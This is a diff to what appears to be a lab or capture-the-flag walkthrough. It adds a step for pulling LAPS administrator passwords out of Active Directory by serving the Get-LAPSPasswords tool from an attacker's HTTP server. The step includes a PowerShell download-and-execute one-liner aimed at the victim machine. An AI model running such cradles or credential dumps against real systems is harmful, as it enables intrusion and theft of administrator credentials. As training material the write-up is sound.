@@ -268,7 +268,14 @@ Members of `LAPS_Readers` can retrieve these passwords from AD.
 
 ### 5.2 Uploading LAPS Retrieval Script
 
-Official method (from AdmPwd.PS):
+Now we can extract the LAPS passwords using the following GitHub tool:  
+https://github.com/kfosaaen/Get-LAPSPasswords
+
+![Downloading LAPS script from GitHub](screenshots/git_clone_LAPS.png)
+
+We start a simple Python HTTP server to make the script available to the victim machine:
+
+![Python HTTP Server](screenshots/python_server.png)
 
 ``` powershell
 IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7/Get-LAPSPasswords.ps1') Get-LAPSPasswords
